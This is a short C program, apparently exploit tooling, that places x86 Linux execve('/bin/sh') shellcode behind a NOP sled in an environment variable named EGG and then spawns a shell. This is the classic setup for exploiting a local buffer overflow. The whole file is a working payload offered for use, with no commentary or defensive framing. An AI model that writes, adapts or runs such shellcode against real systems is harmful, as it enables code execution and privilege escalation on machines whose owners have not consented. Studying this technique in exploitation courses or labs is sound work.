#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define EGG_SIZE	2024
#define NOP			0x90

char shellCode[] = "\x31\xc0"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xE1"
"\x89\xC2"
"\xB0\x0B"
"\xCD\x80"
"\xC9"
"\xC3";

int main()
{
	uint8_t *egg,*ptr;
	uint32_t i = 0;

	egg = (uint8_t*)malloc(EGG_SIZE);
	memset(egg, 0, EGG_SIZE);
	ptr = egg;
	for (i = 0; i < EGG_SIZE - strlen(shellCode) - 1; i++)
	{
		*(uint8_t*)(ptr++) = NOP;
	}
	for (i = 0; i < strlen(shellCode); i++)
	{
		*(uint8_t*)(ptr++) = shellCode[i];
	}
	memcpy(egg, "EGG=", 4);
	putenv(egg);
	system("/bin/sh");

	return 0;
}